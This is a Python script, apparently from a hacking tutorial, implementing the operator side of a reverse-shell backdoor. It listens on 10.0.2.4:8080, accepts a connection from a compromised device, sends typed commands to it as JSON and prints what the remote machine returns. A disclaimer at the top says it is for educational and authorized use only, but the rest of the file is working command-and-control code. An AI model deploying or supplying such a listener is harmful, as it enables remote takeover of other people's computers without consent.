# WARNING: This script is for **educational and authorized use only**.
# Do NOT use this script to connect to or control devices without explicit permission.
# Unauthorized access is illegal and unethical.
# The author is not responsible for any misuse.

#This code must be in the main device


import socket
import sys
import json

class SocketListener:
    def __init__(self, ip, port):
        # Create a TCP socket and configure it to reuse the address
        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind the socket to the specified IP and port
        my_listener.bind((ip, port))
        my_listener.listen(0)
        print("Listening...")

        # Accept an incoming connection
        (self.my_connection, my_address) = my_listener.accept()
        print("Connection OK from " + str(my_address))

    def json_send(self, data):
        # Send data encoded in JSON format
        json_data = json.dumps(data)
        self.my_connection.send(json_data.encode())

    def json_receive(self):
        # Receive and decode JSON data from the connection
        json_data = b""
        while True:
            try:
                json_data += self.my_connection.recv(1024)
                return json.loads(json_data.decode())
            except ValueError:
                # Keep receiving data until it's valid JSON
                continue

    @staticmethod
    def raw_input(prompt=""):
        # Mimic Python 2 raw_input behavior using sys input/output
        sys.stdout.write(prompt)
        sys.stdout.flush()
        return sys.stdin.readline().rstrip('\n')

    def command_execution(self, command_input):
        # Send the command to the connected device
        self.json_send(command_input)

        if command_input[0] == "quit":
            # Close the connection and exit the program
            self.my_connection.close()
            exit()

        # Receive and return the output of the executed command
        return self.json_receive()

    def start_listener(self):
        # Main loop to interactively send commands to the client
        while True:
            command_input = self.raw_input("Enter command: ")
            command_input = command_input.split(" ")
            command_output = self.command_execution(command_input)
            print(command_output)

# Replace the IP and port below with your actual listener IP and port
my_socket_listener = SocketListener("10.0.2.4", 8080)
my_socket_listener.start_listener()